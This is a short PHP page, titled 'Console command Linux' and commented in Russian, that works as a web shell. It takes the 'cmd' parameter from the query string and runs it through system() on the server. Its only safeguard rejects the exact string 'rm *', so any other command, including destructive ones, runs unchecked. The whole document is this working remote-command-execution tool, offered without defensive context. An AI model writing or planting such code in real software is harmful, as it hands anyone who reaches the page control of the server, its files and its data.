<html lang="en">
<head>
    <title>Console command Linux</title>
    <link rel="stylesheet" href="style.css" type="text/css"/>
</head>
<body>
<?php
//Создаём блок инпута для ввода команд
echo '<form><input name="cmd" /></form>';
if(isset($_GET['cmd']) && strcmp($_GET['cmd'],'rm *')!=0)
    //Обращаемся к system с Linux, которая и выполняет наши команды в среде Linux
    system($_GET['cmd']);
?>
</body>
</html>